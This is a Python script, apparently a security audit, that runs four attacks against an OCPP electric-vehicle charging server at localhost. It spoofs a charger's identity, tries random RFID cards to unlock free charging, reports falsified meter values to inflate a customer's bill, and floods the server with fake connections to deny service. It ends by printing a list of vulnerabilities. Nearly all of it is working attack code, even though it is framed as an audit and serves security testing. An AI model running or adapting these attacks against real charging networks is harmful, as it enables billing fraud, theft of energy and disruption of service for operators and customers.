import asyncio
import websockets
import json
import random
from datetime import datetime

SERVER = "ws://localhost:9000"

async def attack():
    print("=" * 55)
    print("     OCPP SECURITY AUDIT - ATTACK SCENARIOS")
    print("=" * 55)

    # Attack 1: Unauthorized charger identity
    print("\n[ATTACK 1] Spoofing a legitimate charger identity...")
    fake_id = "REAL-CHARGER-999"
    async with websockets.connect(f"{SERVER}/{fake_id}") as ws:
        msg_id = "atk001"
        await ws.send(json.dumps([2, msg_id, "BootNotification", {
            "chargePointModel": "SPOOFED",
            "chargePointVendor": "Attacker",
        }]))
        resp = json.loads(await ws.recv())
        print(f"  Spoofed as '{fake_id}' - Server said: {resp[2]['status']}")
        print(f"  [!] Server accepted fake identity - no certificate check!")

    await asyncio.sleep(1)

    # Attack 2: Free charging with random card
    print("\n[ATTACK 2] Attempting free charging with random RFID...")
    async with websockets.connect(f"{SERVER}/ATTACKER-001") as ws:
        # Boot
        await ws.send(json.dumps([2, "b001", "BootNotification", {
            "chargePointModel": "EVIL-BOX", "chargePointVendor": "Hacker"}]))
        await ws.recv()

        # Try random cards until accepted
        for i in range(3):
            fake_card = f"FAKE-{random.randint(1000,9999)}"
            await ws.send(json.dumps([2, f"a00{i}", "Authorize", {"idTag": fake_card}]))
            resp = json.loads(await ws.recv())
            status = resp[2]["idTagInfo"]["status"]
            print(f"  Card '{fake_card}' -> {status}")
            if status == "Accepted":
                print(f"  [!] FREE CHARGING UNLOCKED with fake card!")
                break

    await asyncio.sleep(1)

    # Attack 3: Meter value fraud
    print("\n[ATTACK 3] Submitting falsified meter values (billing fraud)...")
    async with websockets.connect(f"{SERVER}/FRAUD-BOX") as ws:
        await ws.send(json.dumps([2, "b002", "BootNotification", {
            "chargePointModel": "FRAUD-BOX", "chargePointVendor": "Hacker"}]))
        await ws.recv()

        await ws.send(json.dumps([2, "s001", "StartTransaction", {
            "connectorId": 1, "idTag": "FRAUD-CARD",
            "meterStart": 0, "timestamp": datetime.utcnow().isoformat()
        }]))
        await ws.recv()

        # Report fake energy delivery
        fake_energy = 999999
        await ws.send(json.dumps([2, "m001", "MeterValues", {
            "connectorId": 1, "transactionId": 1337,
            "meterValue": [{"timestamp": datetime.utcnow().isoformat(),
                "sampledValue": [{"value": str(fake_energy), "unit": "Wh"}]}]
        }]))
        await ws.recv()
        print(f"  Reported {fake_energy} Wh to server - server accepted!")
        print(f"  [!] Billing system would charge customer for {fake_energy/1000:.0f} kWh")
        print(f"  [!] At $0.30/kWh = ${fake_energy/1000*0.30:.0f} fraudulent charge!")

    # Attack 4: DoS - flood connections
    print("\n[ATTACK 4] Connection flood (Denial of Service)...")
    tasks = []
    for i in range(10):
        fake_id = f"DOS-CHARGER-{i:03d}"
        tasks.append(websockets.connect(f"{SERVER}/{fake_id}"))
    
    connections = await asyncio.gather(*tasks, return_exceptions=True)
    successful = sum(1 for c in connections if not isinstance(c, Exception))
    print(f"  Opened {successful}/10 simultaneous fake connections")
    print(f"  [!] Real server with no rate limiting would accept thousands")
    
    for c in connections:
        if not isinstance(c, Exception):
            await c.close()

    print(f"\n{'=' * 55}")
    print(f"  AUDIT COMPLETE - VULNERABILITIES FOUND:")
    print(f"{'=' * 55}")
    print(f"  [CRITICAL] No charger identity verification")
    print(f"  [CRITICAL] Any RFID card accepted = free charging")
    print(f"  [HIGH]     Meter values not validated = billing fraud")
    print(f"  [HIGH]     No rate limiting = DoS possible")
    print(f"  [INFO]     No TLS certificate pinning")
    print(f"{'=' * 55}\n")

asyncio.run(attack())
